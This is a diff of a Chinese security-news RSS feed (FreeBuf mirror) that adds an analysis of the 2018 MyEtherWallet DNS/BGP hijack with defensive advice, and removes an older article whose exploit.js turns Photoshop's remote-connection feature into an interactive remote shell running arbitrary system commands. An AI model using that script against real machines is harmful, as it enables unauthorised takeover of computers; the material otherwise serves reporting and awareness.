@@ -5,7 +5,16 @@
 <link>https://henix.github.io/feeds/zhuanlan.freebuf/</link>
 <description>新鲜的安全资讯库，官网www.freebuf.com</description>
 <language>zh-cn</language>
-<lastBuildDate>Wed, 25 Apr 2018 00:10:49 +0800</lastBuildDate>
+<lastBuildDate>Thu, 26 Apr 2018 16:29:00 +0800</lastBuildDate>
+<item>
+<title>黑客两小时卷走13000美金，MyEtherWallet DNS劫持事件深度分析</title>
+<link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-04-26-36135899.html</link>
+<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/36135899&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-98da4fd773afaad129df5bdb4664b9eb_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;blockquote&gt;币圈无宁日。无论加密货币或是区块链技术有多么广阔的未来，也不该成为目前混乱现状的理由。圈子里的玩家成分复杂，有真正懂行的，也有纯粹凑热闹的，目前看来后者占据更多。稍有风吹草动便是头条新闻，昨天Myetherwallet的遭遇又为币圈故事添上了教育性的一笔。&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;事件回顾&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Myetherwallet，是目前最受欢迎的以太坊钱包。4月24日发生的一连串事故，让很多用户在一脸懵逼中钱包被清空，两个小时的时间里，黑客盗走至少13000美元，而其账户早已存储价值高达1700万美元的以太坊。一度怀疑是平台遭黑客入侵，毕竟此前发生加密货币交易平台被黑客攻击的案例并不少见。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e5b4ef17e6697c51cb90519a57327f17_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;282&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;一位用户在Reddit上发布一条帖子称自己可能被骗了——&lt;u&gt;&lt;a href=&quot;https://www.reddit.com/r/MyEtherWallet/comments/8ek0jj/think_i_got_scammedphishedhacked/&quot;&gt;Think I got scammed/phished/hacked&lt;/a&gt;&lt;/u&gt;，该用户登录Myetherwallet的时候，仅仅10秒钟的时间，钱包里的ETH就被发送到另一个钱包中。&lt;/p&gt;&lt;u&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-0c48c134bc5a77bc8c0d3e2e99c693ed_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;325&quot; data-rawheight=&quot;419&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;/u&gt;&lt;p&gt;根据其描述，在进入Myetherwallet网站的时候，Chrome提示“网站不安全”，“尽管身体的每个部分都告诉我不要尝试登录”，但还是没控制住自己手。&lt;/p&gt;&lt;p&gt;目前已经有不少用户遭遇了这种情况，但也有一些人看到浏览器提醒SSL证书未签名，便没有继续登录，避免了遭遇损失。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击过程&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;MyEtherWallet在随后的公告中证实了这次攻击，建议用户使用MyEtherWallet的本地（脱机）副本。截至笔者发稿时，MyEtherWallet已经恢复正常，并给出了事故的发生原因，并非MyEtherWallet的安全问题，而是由于Amazon的DNS遭到劫持所导致。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-5718a65e63599fc25b814f8d21a0fa47_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;206&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8055b57af741178d03be3ae5399584ed_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;361&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;根据这次事故发生情况来看，攻击持续了大约两个小时，攻击者利用多个账户转走了受害者的ETH，总价值超过13000美元。而已知的账户地址能够看到详细的交易记录，基本已经全部被提出。&lt;/p&gt;&lt;p&gt;尽管事先大多数人怀疑是MyEtherWallet遭受黑客攻击导致，这次黑客并非直接攻击MyEtherWallet网站，而是从互联网基础设施下手。黑客通过中间人攻击，利用墨西哥Equinix的服务器重定向DNS流量，google DNS服务器8.8.8.8返回&lt;u&gt;&lt;a href=&quot;http://www.myetherwallet.com/&quot;&gt;www.myetherwallet.com&lt;/a&gt;&lt;/u&gt;错误的IP地址是和无效的SSL证书，此IP为俄罗斯的服务器，这个服务器提供了假的证书，并且能窃取用户的用于货币交易用的私钥。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2e0247be574f6ee7f1195b95756f4fbc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;843&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;向MyEtherWallet用户显示的错误证书&lt;/p&gt;&lt;p&gt;而大多数用户都是使用的Google DNS服务器，当用户访问MyEtherWallet.com时，出现 HTTPS 证书错误提示，但有些用户安全意识较低，进行了强制访问，攻击者此时可以通过页面劫持，注入任意恶意js文件来获取用户登录在线钱包的密码、私钥明文等。&lt;/p&gt;&lt;p&gt;攻击者窃取用户私钥后，第一时间就将所有余额转到其钱包地址中。10秒钟的倒计时，足以清空受害者的钱包。&lt;/p&gt;&lt;p&gt;目前已知的攻击者钱包地址为：&lt;/p&gt;&lt;blockquote&gt;&lt;u&gt;&lt;a href=&quot;https://etherscan.io/address/0x1d50588c0aa11959a5c28831ce3dc5f1d3120d29&quot;&gt;https://etherscan.io/address/0x1d50588c0aa11959a5c28831ce3dc5f1d3120d29&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://etherscan.io/address/0xf203a3b241decafd4bdebbb557070db337d0ad27&quot;&gt;https://etherscan.io/address/0xf203a3b241decafd4bdebbb557070db337d0ad27&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://etherscan.io/address/0xb3aaaae47070264f3595c5032ee94b620a583a39&quot;&gt;https://etherscan.io/address/0xb3aaaae47070264f3595c5032ee94b620a583a39&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-79a2349a89812eb15486f156d1799bba_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;300&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;黑客在这次攻击中利用的&lt;u&gt;&lt;a href=&quot;http://www.freebuf.com/articles/network/75305.html&quot;&gt;BGP攻击技术&lt;/a&gt;&lt;/u&gt;，FreeBuf很早之前有过对这方面的介绍。这种技术由一个网络服务提供商或是其他网络基础设施提供者进行操作。通常，取消这样的劫持需要侵入由ISP或其他因特网基础设施提供商操作的BGP服务器。&lt;/p&gt;&lt;p&gt;一直以来，BGP劫持一直被称为互联网的一个根本弱点，它被设计为无需验证就接受路由。但这种攻击方式非常罕见，尤其是在如此大规模的事件中。此次的攻击手法如此之强大，范围大到了主要的互联网服务提供商，和强大的DNS流量处理能力。极有可能MyEtherWallet.com不是唯一的目标。但目前为止，MyEtherWallet是唯一确认受到此类攻击的服务器。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;安全警示&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;针对事件，FreeBuf也总结出一些建议提醒用户提升防范意识：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c93582c8a668e7eb1c3ddecfcbe74200_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;190&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;提高安全意识，不要越过HTTPS证书强制访问&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;配置HSTS&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;HSTS 全称 HTTP Strict Transport Security，是浏览器支持的一个 Web 安全策略，如果开启了这个配置，浏览器发现 HTTPS 证书错误后就会强制不让用户继续访问。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-20e400a48bb5b99c104d2985b765c745_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;616&quot; data-rawheight=&quot;387&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;这图可以看到MyEtherWallet.com官方不从自身找原因，疯狂甩锅。&lt;/p&gt;&lt;p&gt;可以使用下面网站进行自行检测：&lt;/p&gt;&lt;blockquote&gt;&lt;u&gt;&lt;a href=&quot;https://www.ssllabs.com/ssltest/&quot;&gt;https://www.ssllabs.com/ssltest/&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://hstspreload.org/&quot;&gt;https://hstspreload.org/&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;更换DNS服务器&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;将google DNS服务器8.8.8.8更换为Cloudflare DNS 服务器1.1.1.1。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;谨慎评论区钓鱼&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;出现大事件时，评论区经常出现钓鱼链接，已经不是一次两次了。大家一定要谨慎不要因为心慌就去点击，转账。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7d055a2d7c2ee28515554bb815e2a99f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;619&quot; data-rawheight=&quot;480&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dc95e02c44ca5758b2f0eeca8de55e28_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;609&quot; data-rawheight=&quot;926&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9c878f1810961e55d41006b5970b942b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;409&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;&lt;b&gt;交易注意事项&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;可以参考官方给出的科普文：&lt;u&gt;&lt;a href=&quot;https://myetherwallet.github.io/knowledge-base/security/myetherwallet-protips-how-not-to-get-scammed-during-ico.html&quot;&gt;How Not to get Scammed &amp;amp; Phished&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;参考&lt;/b&gt;&lt;/h2&gt;&lt;blockquote&gt;&lt;u&gt;&lt;a href=&quot;https://www.theverge.com/2018/4/24/17275982/myetherwallet-hack-bgp-dns-hijacking-stolen-ethereum&quot;&gt;https://www.theverge.com/2018/4/24/17275982/myetherwallet-hack-bgp-dns-hijacking-stolen-ethereum&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://blog.cloudflare.com/bgp-leaks-and-crypto-currencies/&quot;&gt;https://blog.cloudflare.com/bgp-leaks-and-crypto-currencies/&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://mailman.nanog.org/pipermail/nanog/2018-April/095105.html&quot;&gt;https://mailman.nanog.org/pipermail/nanog/2018-April/095105.html&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://twitter.com/dentcoin/status/988759919208943616&quot;&gt;https://twitter.com/dentcoin/status/988759919208943616&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://twitter.com/myetherwallet/status/988830654316953600&quot;&gt;https://twitter.com/myetherwallet/status/988830654316953600&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://doublepulsar.com/hijack-of-amazons-internet-domain-service-used-to-reroute-web-traffic-for-two-hours-unnoticed-3a6f0dda6a6f&quot;&gt;https://doublepulsar.com/hijack-of-amazons-internet-domain-service-used-to-reroute-web-traffic-for-two-hours-unnoticed-3a6f0dda6a6f&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://www.reddit.com/r/MyEtherWallet/comments/8eloo9/official_statement_regarding_dns_spoofing_of/&quot;&gt;https://www.reddit.com/r/MyEtherWallet/comments/8eloo9/official_statement_regarding_dns_spoofing_of/&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security&quot;&gt;https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security&lt;/a&gt;&lt;/u&gt;&lt;br&gt;&lt;u&gt;&lt;a href=&quot;https://myetherwallet.github.io/knowledge-base/security/myetherwallet-protips-how-not-to-get-scammed-during-ico.html&quot;&gt;https://myetherwallet.github.io/knowledge-base/security/myetherwallet-protips-how-not-to-get-scammed-during-ico.html&lt;/a&gt;&lt;/u&gt;&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;原文链接&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.freebuf.com/articles/blockchain-articles/169773.html&quot;&gt;黑客两小时卷走13000美金，MyEtherWallet DNS劫持事件深度分析&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;*本文作者：Andy，技术分析来自斗象科技TCC，转载请注明来自FreeBuf.COM&lt;/b&gt;&lt;/p&gt;</description>
+<author>鲍弘捷</author>
+<guid isPermaLink="false">2018-04-26-36135899</guid>
+<pubDate>Thu, 26 Apr 2018 00:00:00 +0800</pubDate>
+</item>
 <item>
 <title>看我如何利用漏洞更改Google搜索排名</title>
 <link>https://henix.github.io/feeds/zhuanlan.freebuf/2018-04-24-36055514.html</link>
@@ -218,70 +227,6 @@ if __name__ == &#39;__main__&#39;:
 <author>鲍弘捷</author>
 <guid isPermaLink="false">2017-08-18-28609222</guid>
 <pubDate>Fri, 18 Aug 2017 00:00:00 +0800</pubDate>
-</item>
-<item>
-<title>如何把Photoshop改造成远程控制工具（RAT）来利用</title>
-<link>https://henix.github.io/feeds/zhuanlan.freebuf/2017-08-09-28419023.html</link>
-<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28419023&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;作者在本文中通过对Photoshop远程连接功能的改造利用，最终实现了对开启远程连接功能的Photoshop端操作系统的接管控制。&lt;/p&gt;&lt;h2&gt;Photoshop远程连接功能说明&lt;/h2&gt;&lt;p&gt;Photoshop中有一个名为远程连接（Remote Connections）的可选功能，该功能默认是关闭的，但如果你启用该功能并设置密码后，任何知晓密码的人就可以远程接入到你电脑的Photoshop服务端。如下开启画面：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bc3e858ce3019ff3db9920677268c0d9_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;353&quot;&gt;&lt;p&gt;正常用户利用该功能，来实时预览不同PS文件在iPad或手机等远程设备上的实际设计外观样式，该远程预览功能需要手机等移动终端安装如PS Playon和Skala Preview等第三方APP来实现连接。如Skala Preview：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-b5771364f19736931d29e426bf2c4f1b_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;361&quot;&gt;&lt;p&gt;该远程连接功能基于Photoshop的JSX脚本实例。JSX属Photoshop的宏脚本，由Javascript语言编写，以实现Photoshop的图片加载、颜色渲染、矢量绘制和导出等功能，可&lt;a href=&quot;http://wwwimages.adobe.com/content/dam/Adobe/en/devnet/photoshop/pdfs/photoshop-cc-scripting-guide-2015.pdf&quot;&gt;点此查看&lt;/a&gt;JSX的相关编写规范和可用接口。&lt;/p&gt;&lt;p&gt;另外，Adobe提供了一个开源库内核生成器来建立该远程连接，所以如果您对其中的协议细节有兴趣，也可&lt;a href=&quot;https://github.com/adobe-photoshop/generator-core/blob/master/lib/ps_crypto.js#L51&quot;&gt;点此查看&lt;/a&gt;。当开启远程连接后，Photoshop将会对49494端口进行监听：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$ netstat -an | grep 49494
-tcp4 0 0 *.49494 *.* LISTEN&lt;/code&gt;&lt;p&gt;以下代码为与远程Photoshop服务端用来进行身份验证交互的代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const core = require(&quot;generator-core/lib/generator&quot;)
-const options = {
-    host: &#39;192.168.1.123&#39;,
-    password: &#39;password&#39;,
-    port: 49494
-}
-const generator = core.createGenerator()
-generator.start(options).done(() =&amp;gt; {
-    generator.evaluateJSXString(&#39;alert(&quot;Hello&quot;)&#39;).then(() =&amp;gt; generator.shutdown())
-})&lt;/code&gt;&lt;p&gt;对此，我曾尝试利用以下app.system方法来调用系统命令：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;alert(app.system(“id”))&lt;/code&gt;&lt;p&gt;但遗憾的是其返回值却是一些退出状态码，不是标准的命令输出内容。经过研究，我发现Photoshop的JSX脚本具备系统访问接口，所以，这样一来，我们可以把其标准输出内容（stdout）重定向到一个临时文件中，之后，就可以对该文件进行读取。如下所示：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;var tmpFile = Folder.temp + &#39;output.txt&#39;;
-app.system(&quot;id &amp;gt; &quot; + tmpFile);
-var stdout = new File(${tmpFile});
-stdout.open(&#39;r&#39;);
-stdout.encoding = &quot;UTF-8&quot;;
-var content = stdout.read();
-stdout.close();
-stdout.remove();
-alert(content);&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d14d18dd97cc301c214f531b82dbcea0_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;531&quot;&gt;&lt;h2&gt;Photoshop RAT 改造成型&lt;/h2&gt;&lt;p&gt;因此，我可以在上述身份验证代码中作出如下修改，通过用户名密码方式登录远程Photoshop服务端，之后，再利用JSX脚本接口间接执行Photoshop服务端系统命令，实现对远程Photoshop服务端系统的直接接管控制。以下为exploit代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;exploit.js:
-const readline = require(&#39;readline&#39;)
-const backdoor = require(&quot;generator-core/lib/generator&quot;)
-const options = {
-  host: &#39;192.168.0.101&#39;,
-  password: &#39;password&#39;,
-  port: 49494,
-}
-console.info(&#39;Establishing connection to &#39; + options.host)
-const generator = backdoor.createGenerator()
-generator.start(options).done(() =&amp;gt; {
-  const rl = readline.createInterface({input: process.stdin, output: process.stdout, prompt: &#39;&amp;gt; &#39;})
-    .on(&#39;line&#39;, line =&amp;gt; {
-      let command = line.trim()
-      let tmpFile = `Folder.temp + ${JSON.stringify(Math.random() + &#39;.txt&#39;)}`
-      let jsx = `
-        app.system(&quot;${command} &amp;gt; &quot; + ${tmpFile});
-        var stdout = new File(${tmpFile});
-stdout.open(&#39;r&#39;);
-        stdout.encoding = &quot;UTF-8&quot;;
-        var content = stdout.read();
-        stdout.close();
-        stdout.remove();
-        content
-        `
-      generator.evaluateJSXString(jsx).then(output =&amp;gt; {
-        console.log(output)
-        rl.prompt()
-      })
-    })
-    .on(&#39;SIGINT&#39;, () =&amp;gt; {
-      console.log(&#39;bye&#39;)
-      generator.shutdown()
-      rl.close()
-    })
-  console.log(&#39;Remote photoshop shell&#39;)
-  rl.prompt()
-})&lt;/code&gt;&lt;p&gt;成功利用后，读取远程Photoshop服务端操作系统密码：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-af6eedaf4ed1f9e3477f134eac624533_r.jpg&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;311&quot;&gt;&lt;h2&gt;影响分析&lt;/h2&gt;&lt;p&gt;在内网中，你可以通过49494端口扫描或组播DNS”_photoshopserver.tcp”抓包来探测一些开启远程连接功能的Photoshop服务端，之后利用以上exploit.js进行把玩。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7cd77c2e3313ac86c639b83ea95b0354_r.jpg&quot; data-rawwidth=&quot;690&quot; data-rawheight=&quot;302&quot;&gt;&lt;p&gt;该功能的此种RAT方式利用，&lt;b&gt;前提必须知晓对方Photoshop服务远程连接密码，因此并不属于漏洞范畴。基于此，请谨慎开启你的Photoshop远程连接功能，或严格保存你的Photoshop远程连接密码，否则，你的操作系统有可能被不怀好意之人远程控制。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;*参考来源：&lt;a href=&quot;https://medium.com/0xcc/how-to-turn-photoshop-into-a-remote-access-tool-805485a9480&quot;&gt;medium&lt;/a&gt;，作者：Clouds，转载请注明来自&lt;a href=&quot;http://www.freebuf.com&quot;&gt;FreeBuf.COM&lt;/a&gt;   &lt;/p&gt;</description>
-<author>鲍弘捷</author>
-<guid isPermaLink="false">2017-08-09-28419023</guid>
-<pubDate>Wed, 09 Aug 2017 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
